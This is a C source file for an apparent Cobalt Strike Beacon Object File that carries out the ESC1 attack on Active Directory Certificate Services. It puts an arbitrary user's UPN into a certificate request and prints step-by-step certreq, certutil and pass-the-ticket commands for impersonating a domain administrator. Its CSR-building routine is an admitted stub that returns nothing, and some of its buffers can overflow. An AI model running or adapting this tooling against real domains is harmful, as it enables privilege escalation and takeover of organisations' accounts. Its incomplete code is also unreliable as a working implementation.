/*
 * cert_request - Request Certificates from CA
 *
 * Requests a certificate from a Certificate Authority using a specified template.
 * Supports ESC1 exploitation via /altname for subject alternative name injection.
 *
 * Usage: cert_request /ca:CA_NAME /template:TEMPLATE [/altname:USER@DOMAIN]
 *                     [/subject:CN=...] [/install] [/machine]
 */

#include "include/adcs_struct.h"
#include "include/adcs_utils.h"
#include "beacon.h"

/* ICertRequest2 interface */
DEFINE_GUID(CLSID_CCertRequest, 0x98aff3f0, 0x5524, 0x11d0, 0x88, 0x12, 0x00, 0xa0, 0xc9, 0x03, 0xb8, 0x3c);
DEFINE_GUID(IID_ICertRequest2, 0xa4772988, 0x4a85, 0x11d0, 0x88, 0x12, 0x00, 0xa0, 0xc9, 0x03, 0xb8, 0x3c);

/* CR_IN_* flags */
#define CR_IN_BASE64HEADER 0x00000000
#define CR_IN_BASE64 0x00000001
#define CR_IN_BINARY 0x00000002
#define CR_IN_PKCS10 0x00000100
#define CR_IN_FORMATANY 0x00000000
#define CR_IN_FORMATMASK 0x0000FF00

/* CR_OUT_* flags */
#define CR_OUT_BASE64HEADER 0x00000000
#define CR_OUT_BASE64 0x00000001
#define CR_OUT_BINARY 0x00000002
#define CR_OUT_CHAIN 0x00000100

/* CR_PROP_* */
#define CR_PROP_CASIGCERTCOUNT 11
#define CR_PROP_CASIGCERT 12
#define CR_PROP_BASECRL 17
#define CR_PROP_DELTACRL 18


typedef struct {
    char* buffer;
    int length;
    int position;
} ARG_PARSER;

static void arg_init(ARG_PARSER* parser, char* buffer, int length) {
    parser->buffer = buffer;
    parser->length = length;
    parser->position = 0;
}

static char* arg_get(ARG_PARSER* parser, const char* name) {
    char* buf = parser->buffer;
    int len = parser->length;
    char search[64];
    sprintf(search, "/%s:", name);
    int searchLen = strlen(search);

    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char* start = buf + i + searchLen;
            char* end = start;
            while (*end && *end != ' ' && *end != '\t' && *end != '\n') end++;
            int valueLen = end - start;
            char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, valueLen + 1);
            if (value) {
                memcpy(value, start, valueLen);
                value[valueLen] = '\0';
            }
            return value;
        }
    }

    sprintf(search, "/%s", name);
    searchLen = strlen(search);
    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char next = buf[i + searchLen];
            if (next == '\0' || next == ' ' || next == '\t' || next == '\n') {
                char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 2);
                if (value) value[0] = '1';
                return value;
            }
        }
    }

    return NULL;
}


static BYTE* generate_csr(const char* subject, const char* altName, size_t* csrLen,
                          HCRYPTPROV* hProvOut, HCRYPTKEY* hKeyOut, formatp* output) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BYTE* csr = NULL;


    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, MS_STRONG_PROV_A, PROV_RSA_FULL,
                                        CRYPT_NEWKEYSET | CRYPT_MACHINE_KEYSET)) {
        if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, MS_STRONG_PROV_A, PROV_RSA_FULL,
                                            CRYPT_MACHINE_KEYSET)) {
            if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL,
                                                CRYPT_VERIFYCONTEXT)) {
                BeaconFormatPrintf(output, "[-] CryptAcquireContext failed: %d\n", KERNEL32$GetLastError());
                return NULL;
            }
        }
    }


    if (!ADVAPI32$CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
        BeaconFormatPrintf(output, "[-] CryptGenKey failed: %d\n", KERNEL32$GetLastError());
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return NULL;
    }

    BeaconFormatPrintf(output, "[+] Generated 2048-bit RSA key pair\n");

    /* For simplicity, we'll build a minimal CSR manually */
    /* A real implementation would use CryptSignAndEncodeCertificate */


    BYTE subjectDN[256];
    size_t subjectDNLen = 0;


    const char* cn = subject;
    if (strncmp(subject, "CN=", 3) == 0) cn = subject + 3;

    size_t cnLen = strlen(cn);
    BYTE rdnSeq[128];
    size_t rdnSeqLen = 0;


    BYTE atv[64];
    size_t atvLen = 0;


    BYTE cnOid[] = { 0x06, 0x03, 0x55, 0x04, 0x03 };
    memcpy(atv + atvLen, cnOid, sizeof(cnOid));
    atvLen += sizeof(cnOid);


    atv[atvLen++] = 0x0C;  /* UTF8String */
    atv[atvLen++] = (BYTE)cnLen;
    memcpy(atv + atvLen, cn, cnLen);
    atvLen += cnLen;


    rdnSeq[rdnSeqLen++] = 0x30;
    rdnSeq[rdnSeqLen++] = (BYTE)atvLen;
    memcpy(rdnSeq + rdnSeqLen, atv, atvLen);
    rdnSeqLen += atvLen;


    BYTE rdn[96];
    size_t rdnLen = 0;
    rdn[rdnLen++] = 0x31;
    rdn[rdnLen++] = (BYTE)rdnSeqLen;
    memcpy(rdn + rdnLen, rdnSeq, rdnSeqLen);
    rdnLen += rdnSeqLen;


    subjectDN[subjectDNLen++] = 0x30;
    subjectDN[subjectDNLen++] = (BYTE)rdnLen;
    memcpy(subjectDN + subjectDNLen, rdn, rdnLen);
    subjectDNLen += rdnLen;


    BYTE pubKeyBlob[512];
    DWORD pubKeyBlobLen = sizeof(pubKeyBlob);
    if (!ADVAPI32$CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubKeyBlob, &pubKeyBlobLen)) {
        BeaconFormatPrintf(output, "[-] CryptExportKey failed: %d\n", KERNEL32$GetLastError());
        ADVAPI32$CryptDestroyKey(hKey);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return NULL;
    }


    BYTE extensions[512];
    size_t extLen = 0;

    if (altName && strlen(altName) > 0) {


        BYTE sanOid[] = { 0x06, 0x03, 0x55, 0x1D, 0x11 };

        /* UPN OtherName (OID 1.3.6.1.4.1.311.20.2.3) */
        BYTE upnOid[] = { 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03 };

        size_t altNameLen = strlen(altName);


        BYTE generalName[256];
        size_t gnLen = 0;


        generalName[gnLen++] = 0xA0;


        size_t innerLen = sizeof(upnOid) + 2 + 2 + altNameLen;
        generalName[gnLen++] = (BYTE)innerLen;


        memcpy(generalName + gnLen, upnOid, sizeof(upnOid));
        gnLen += sizeof(upnOid);


        generalName[gnLen++] = 0xA0;
        generalName[gnLen++] = (BYTE)(altNameLen + 2);


        generalName[gnLen++] = 0x0C;
        generalName[gnLen++] = (BYTE)altNameLen;
        memcpy(generalName + gnLen, altName, altNameLen);
        gnLen += altNameLen;


        BYTE sanValue[280];
        size_t sanValueLen = 0;
        sanValue[sanValueLen++] = 0x30;
        sanValue[sanValueLen++] = (BYTE)gnLen;
        memcpy(sanValue + sanValueLen, generalName, gnLen);
        sanValueLen += gnLen;


        extensions[extLen++] = 0x30;  /* SEQUENCE */
        size_t extSeqLen = sizeof(sanOid) + 2 + sanValueLen;
        extensions[extLen++] = (BYTE)extSeqLen;

        memcpy(extensions + extLen, sanOid, sizeof(sanOid));
        extLen += sizeof(sanOid);

        /* OCTET STRING for value */
        extensions[extLen++] = 0x04;
        extensions[extLen++] = (BYTE)sanValueLen;
        memcpy(extensions + extLen, sanValue, sanValueLen);
        extLen += sanValueLen;

        BeaconFormatPrintf(output, "[*] Added SAN extension: %s\n", altName);
    }

    /* Note: Building a complete PKCS#10 CSR requires proper ASN.1 encoding */
    /* For this BOF, we'll output what's needed and note manual steps */

    BeaconFormatPrintf(output, "[*] Subject: %s\n", subject);
    BeaconFormatPrintf(output, "[*] CSR generation simplified - use certreq.exe for full CSR:\n");
    BeaconFormatPrintf(output, "    certreq -new request.inf request.req\n");

    *hProvOut = hProv;
    *hKeyOut = hKey;


    *csrLen = 0;
    return NULL;
}


static int request_certificate(const char* caConfig, const char* templateName,
                               const char* subject, const char* altName,
                               formatp* output) {
    HRESULT hr;


    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        BeaconFormatPrintf(output, "[-] CoInitializeEx failed: 0x%08X\n", hr);
        return 0;
    }

    BeaconFormatPrintf(output, "[*] Requesting certificate from CA: %s\n", caConfig);
    BeaconFormatPrintf(output, "[*] Template: %s\n", templateName);
    if (altName) {
        BeaconFormatPrintf(output, "[*] SAN (UPN): %s\n", altName);
    }


    char attribs[512];
    sprintf(attribs, "CertificateTemplate:%s", templateName);

    if (altName) {
        /* For ESC1 exploitation, add SAN via request attributes */
        BeaconFormatPrintf(output, "\n[*] ESC1 Exploitation:\n");
        BeaconFormatPrintf(output, "    To request cert with arbitrary SAN, use:\n");
        BeaconFormatPrintf(output, "    certreq -submit -attrib \"CertificateTemplate:%s\\nSAN:upn=%s\" request.req\n",
            templateName, altName);
    }


    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    size_t csrLen = 0;
    BYTE* csr = generate_csr(subject, altName, &csrLen, &hProv, &hKey, output);


    BeaconFormatPrintf(output, "\n[*] Manual Certificate Request Steps:\n");
    BeaconFormatPrintf(output, "    1. Create request.inf:\n");
    BeaconFormatPrintf(output, "       [NewRequest]\n");
    BeaconFormatPrintf(output, "       Subject = \"%s\"\n", subject);
    BeaconFormatPrintf(output, "       KeySpec = 1\n");
    BeaconFormatPrintf(output, "       KeyLength = 2048\n");
    BeaconFormatPrintf(output, "       Exportable = TRUE\n");
    BeaconFormatPrintf(output, "       MachineKeySet = FALSE\n");
    BeaconFormatPrintf(output, "       ProviderName = \"Microsoft RSA SChannel Cryptographic Provider\"\n");
    BeaconFormatPrintf(output, "       RequestType = PKCS10\n");

    if (altName) {
        BeaconFormatPrintf(output, "       [Extensions]\n");
        BeaconFormatPrintf(output, "       2.5.29.17 = \"{text}upn=%s\"\n", altName);
    }

    BeaconFormatPrintf(output, "\n    2. Generate CSR:\n");
    BeaconFormatPrintf(output, "       certreq -new request.inf request.req\n");
    BeaconFormatPrintf(output, "\n    3. Submit request:\n");
    BeaconFormatPrintf(output, "       certreq -submit -config \"%s\" -attrib \"CertificateTemplate:%s\" request.req cert.cer\n",
        caConfig, templateName);
    BeaconFormatPrintf(output, "\n    4. Accept certificate:\n");
    BeaconFormatPrintf(output, "       certreq -accept cert.cer\n");


    if (hKey) ADVAPI32$CryptDestroyKey(hKey);
    if (hProv) ADVAPI32$CryptReleaseContext(hProv, 0);
    if (csr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, csr);

    OLE32$CoUninitialize();
    return 1;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* ca = NULL;
    char* templateName = NULL;
    char* altName = NULL;
    char* subject = NULL;
    char* install = NULL;
    char* machine = NULL;

    BeaconFormatAlloc(&output, 32768);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Request Certificate\n\n");


    ca = arg_get(&parser, "ca");
    templateName = arg_get(&parser, "template");
    altName = arg_get(&parser, "altname");
    subject = arg_get(&parser, "subject");
    install = arg_get(&parser, "install");
    machine = arg_get(&parser, "machine");

    if (!ca || !templateName) {
        BeaconFormatPrintf(&output, "[-] Error: /ca:CA_CONFIG and /template:TEMPLATE_NAME required\n\n");
        BeaconFormatPrintf(&output, "Usage: cert_request /ca:CA\\CAName /template:TEMPLATE [options]\n\n");
        BeaconFormatPrintf(&output, "Options:\n");
        BeaconFormatPrintf(&output, "  /ca:SERVER\\CAName   - Target CA (e.g., DC01.domain.com\\domain-CA)\n");
        BeaconFormatPrintf(&output, "  /template:NAME      - Certificate template name\n");
        BeaconFormatPrintf(&output, "  /altname:USER@DOM   - Subject Alternative Name (UPN) for ESC1\n");
        BeaconFormatPrintf(&output, "  /subject:CN=...     - Subject distinguished name\n");
        BeaconFormatPrintf(&output, "  /install            - Install cert in local store\n");
        BeaconFormatPrintf(&output, "  /machine            - Use machine context\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
        BeaconFormatPrintf(&output, "  cert_request /ca:dc01.corp.local\\corp-CA /template:User\n");
        BeaconFormatPrintf(&output, "  cert_request /ca:dc01.corp.local\\corp-CA /template:ESC1Template /altname:admin@corp.local\n");
        goto cleanup;
    }


    if (!subject) {
        subject = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 64);
        sprintf(subject, "CN=User");
    }


    request_certificate(ca, templateName, subject, altName, &output);

    BeaconFormatPrintf(&output, "\n[*] Exploitation with obtained certificate:\n");
    BeaconFormatPrintf(&output, "    1. Export to PFX:\n");
    BeaconFormatPrintf(&output, "       certutil -exportpfx -p \"password\" My <thumbprint> cert.pfx\n");
    BeaconFormatPrintf(&output, "    2. Request TGT (Rubeus/Kerbeus):\n");
    BeaconFormatPrintf(&output, "       krb_asktgt /user:ADMIN /certificate:cert.pfx /password:password /ptt\n");

cleanup:
    if (ca) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ca);
    if (templateName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, templateName);
    if (altName) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, altName);
    if (subject) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, subject);
    if (install) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, install);
    if (machine) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, machine);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
